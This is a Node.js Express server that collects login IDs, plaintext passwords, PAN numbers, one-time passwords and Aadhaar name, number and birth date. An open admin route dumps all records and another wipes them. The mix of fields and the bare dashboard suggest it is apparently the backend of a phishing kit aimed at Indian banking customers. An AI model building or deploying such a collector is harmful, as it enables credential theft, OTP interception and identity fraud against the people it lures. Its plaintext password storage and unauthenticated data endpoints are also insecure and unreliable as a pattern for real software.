const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const User = require('./models/user');

const app = express();

// Middleware
app.use(express.json());
app.use(cors());

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log('MongoDB Connected'))
  .catch(err => console.log('Database Connection Error:', err));

// Serve Static Files
app.use(express.static(path.join(__dirname, 'frontend')));

// API Routes

// Save Login Details
app.post('/api/save-login', async (req, res) => {
  const { userId, password } = req.body;
  const user = new User({ userId, password });
  await user.save();
  res.status(200).json({ success: true });
});

// Save PAN Number
app.post('/api/save-pan', async (req, res) => {
  const { panNumber, userId } = req.body;

  try {
    const user = await User.findOne({ userId });
    if (user) {
      user.panNumber = panNumber;
      await user.save();
      res.status(200).json({ message: 'PAN Number saved' });
    } else {
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Error saving PAN' });
  }
});

// Save OTP
app.post('/api/save-otp', async (req, res) => {
  const { otp } = req.body;

  try {
    const user = await User.findOne().sort({ createdAt: -1 });
    if (user) {
      user.otp = otp;
      await user.save();
      res.status(200).json({ message: 'OTP saved' });
    } else {
      res.status(404).json({ error: 'No user found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Error saving OTP' });
  }
});

// Update OTP
app.post('/api/update-otp', async (req, res) => {
  const { otp, userId } = req.body;

  try {
    const user = await User.findOne({ userId });
    if (user) {
      user.lastOtp = otp;
      await user.save();
      res.status(200).json({ message: 'OTP updated successfully!' });
    } else {
      res.status(404).json({ message: 'User not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Error updating OTP' });
  }
});

// Update Aadhaar Details
app.post('/api/update-aadhar', async (req, res) => {
  const { name, aadharNumber, dob, userId } = req.body;

  try {
    const user = await User.findOne({ userId });
    if (user) {
      user.aadhaarName = name;
      user.aadhaarNumber = aadharNumber;
      user.aadhaarDob = dob;
      await user.save();
      res.status(200).json({ message: 'Aadhaar details updated successfully!' });
    } else {
      res.status(404).json({ message: 'User not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Error updating Aadhaar details' });
  }
});

// Get data for Admin Dashboard
app.get('/api/dashboard', async (req, res) => {
  const users = await User.find().sort({ createdAt: -1 });
  res.status(200).json(users);
});

// Delete all users
app.delete('/api/dashboard', async (req, res) => {
  await User.deleteMany({});
  res.status(200).json({ message: 'All data deleted' });
});

// Catch-All Route for Frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
});

// Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
